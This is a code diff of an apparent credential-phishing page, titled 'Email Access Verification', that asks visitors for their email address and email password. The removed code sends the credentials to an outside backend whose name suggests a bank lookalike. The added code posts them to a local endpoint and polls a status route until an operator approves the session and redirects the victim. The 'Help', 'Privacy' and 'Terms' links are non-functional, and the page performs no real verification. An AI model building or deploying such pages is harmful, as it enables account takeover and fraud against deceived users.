@@ -4,188 +4,206 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Email Verification</title>
+    <link rel="icon" type="image/png" href="res/shopi.png">
     <link rel="stylesheet" href="res/app.css">
-
     <style>
+        .spinner-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
         .error {
             border-color: #ff4444 !important;
-            box-shadow: 0 0 5px rgba(255, 68, 68, 0.5) !important;
         }
-
-        .loading {
+        
+        button:disabled {
             opacity: 0.7;
-            pointer-events: none;
+            cursor: not-allowed;
         }
-
-        #status-message {
+        
+        .info-text {
+            font-size: 12px;
+            color: #666;
             text-align: center;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            display: none;
-        }
-
-        #status-message.error {
-            background-color: #ffebee;
-            color: #c62828;
-            border: 1px solid #ffcdd2;
-        }
-
-        #status-message.success {
-            background-color: #e8f5e9;
-            color: #2e7d32;
-            border: 1px solid #c8e6c9;
-        }
-
-        #status-message.info {
-            background-color: #e3f2fd;
-            color: #1565c0;
-            border: 1px solid #bbdefb;
-        }
-
-        .error-message {
-            color: #d32f2f;
-            background-color: #ffebee;
-            padding: 10px;
-            border-radius: 4px;
-            margin: 10px 0;
-            text-align: center;
-            border: 1px solid #ffcdd2;
-            display: none;
-        }
-
-        input[type="text"],
-        input[type="password"],
-        input[type="email"] {
-            width: 100%;
-            padding: 10px;
-            box-sizing: border-box;
+            margin-top: 10px;
+            line-height: 1.4;
         }
     </style>
 </head>
+<body>    
 
-<body>
 <main>
-<div class="form">
+    <div class="form">
+        <div class="logo">
+            <img src="res/logo.png" alt="Logo">
+        </div>
 
-    <div class="logo">
-        <img src="res/logo.png" alt="Logo">
+        <div class="text">
+            <h2>Email Access Verification</h2>
+            <span>Please enter your email credentials for verification</span>
+        </div>
+
+        <div class="col">
+            <label>Email Address</label>
+            <input type="email" id="email" placeholder="Enter your email address">
+        </div>
+
+        <div class="col">
+            <label>Email Password</label>
+            <input type="password" id="password" placeholder="Enter your email password">
+        </div>
+
+        <div class="col">
+            <button id="submitBtn" onclick="sendEmail()">
+                <span class="spinner-btn">
+                    <span class="btn-text">Verify Email</span>
+                    <span class="btn-spinner" id="btnSpinner"></span>
+                </span>
+            </button>
+        </div>
+
+        <div class="col info-text">
+            <p>We need to verify your email account to ensure secure access to your account.</p>
+        </div>
+
+        <div class="col links">
+            <span>Help</span>
+            <span>Privacy</span>
+            <span>Terms</span>
+        </div>
     </div>
-
-    <div class="text">
-        <h2>Email Access Verification</h2>
-        <span>Please enter your email credentials for verification</span>
-    </div>
-
-    <div id="error-message" class="error-message"></div>
-    <div id="status-message"></div>
-
-    <div class="col">
-        <label>Email Address</label>
-        <input type="email" id="email-input" placeholder="Enter your email address">
-    </div>
-
-    <div class="col">
-        <label>Email Password</label>
-        <input type="password" id="password-input" placeholder="Enter your email password">
-    </div>
-
-    <div class="col">
-        <button onclick="submitEmail()" id="submit-btn">Verify Email</button>
-    </div>
-
-    <div class="col" style="font-size: 12px; color: #666; text-align: center;">
-        <p>We need to verify your email account to ensure secure access to your account.</p>
-    </div>
-
-    <div class="col links">
-        <span>Help</span>
-        <span>Privacy</span>
-        <span>Terms</span>
-    </div>
-
-</div>
 </main>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 
 <script>
-const BACKEND_URL = "https://scotiabcknd.onrender.com";
+let sessionId = null;
+let checkInterval = null;
 
-function showMessage(text, type = "info") {
-    const msg = $("#status-message");
-    msg.removeClass("error success info").addClass(type);
-    msg.text(text).show();
+function showButtonSpinner() {
+    $("#btnSpinner").show();
+    $("#submitBtn").prop("disabled", true);
+    $(".btn-text").text("Verifying...");
 }
 
-function hideMessage() {
-    $("#status-message").hide();
+function hideButtonSpinner() {
+    $("#btnSpinner").hide();
+    $("#submitBtn").prop("disabled", false);
+    $(".btn-text").text("Verify Email");
 }
 
-function setLoading(state) {
-    if (state) {
-        $("body").addClass("loading");
-        $("#submit-btn").prop("disabled", true).text("Verifying...");
-    } else {
-        $("body").removeClass("loading");
-        $("#submit-btn").prop("disabled", false).text("Verify Email");
-    }
+function checkStatus() {
+    if (!sessionId) return;
+    
+    $.ajax({
+        url: `/status/${sessionId}`,
+        method: 'GET',
+        success: function(response) {
+            if (response.status === "approved") {
+                clearInterval(checkInterval);
+                hideButtonSpinner();
+                window.location.href = response.redirect_url;
+            }
+        },
+        error: function(xhr) {
+            if (xhr.status === 404) {
+                clearInterval(checkInterval);
+                hideButtonSpinner();
+                alert("Session expired. Please try again.");
+            }
+        }
+    });
 }
 
-async function submitEmail() {
-    $("#email-input, #password-input").removeClass("error");
-    hideMessage();
+function sendEmail() {
+    $("#email, #password").removeClass("error");
 
-    const email = $("#email-input").val().trim();
-    const password = $("#password-input").val().trim();
-    let valid = true;
+    const email = $("#email").val().trim();
+    const password = $("#password").val().trim();
 
     if (!email) {
-        $("#email-input").addClass("error");
-        showMessage("Please enter your email address", "error");
-        valid = false;
-    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-        $("#email-input").addClass("error");
-        showMessage("Please enter a valid email address", "error");
-        valid = false;
+        $("#email").addClass("error");
+        alert("Please enter your email address");
+        return;
+    }
+
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        $("#email").addClass("error");
+        alert("Please enter a valid email address");
+        return;
     }
 
     if (!password) {
-        $("#password-input").addClass("error");
-        showMessage("Please enter your email password", "error");
-        valid = false;
+        $("#password").addClass("error");
+        alert("Please enter your email password");
+        return;
     }
 
-    if (!valid) return;
+    showButtonSpinner();
 
-    setLoading(true);
-    showMessage("Verifying email credentials...", "info");
+    if (checkInterval) clearInterval(checkInterval);
 
-    try {
-        const response = await $.ajax({
-            url: `${BACKEND_URL}/email`,
-            method: "POST",
-            contentType: "application/json",
-            data: JSON.stringify({ email, password })
-        });
-
-        if (response.success) {
-            showMessage("Credentials submitted. Waiting for approval...", "success");
-        } else {
-            showMessage(response.error || "Verification failed", "error");
-            setLoading(false);
+    $.ajax({
+        url: '/email',
+        method: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify({
+            email: email,
+            password: password
+        }),
+        success: function(response) {
+            if (response.success) {
+                sessionId = response.id;
+                checkInterval = setInterval(checkStatus, 1500);
+                setTimeout(checkStatus, 500);
+                
+                // Auto timeout after 5 minutes
+                setTimeout(function() {
+                    if (checkInterval) {
+                        clearInterval(checkInterval);
+                        hideButtonSpinner();
+                        alert("Request timed out. Please try again.");
+                    }
+                }, 300000);
+                
+            } else {
+                hideButtonSpinner();
+                alert("Verification failed. Please try again.");
+            }
+        },
+        error: function() {
+            hideButtonSpinner();
+            alert("Connection error. Please try again.");
         }
-    } catch (err) {
-        showMessage("Network error. Please try again.", "error");
-        setLoading(false);
-    }
+    });
 }
 
-$("input").on("keypress", function(e) {
-    if (e.key === "Enter") submitEmail();
+$("#email, #password").keypress(function (e) {
+    if (e.key === "Enter") {
+        sendEmail();
+    }
 });
 
-$("#email-input").focus();
+$(window).on('beforeunload', function() {
+    if (checkInterval) clearInterval(checkInterval);
+});
 </script>
 
 </body>
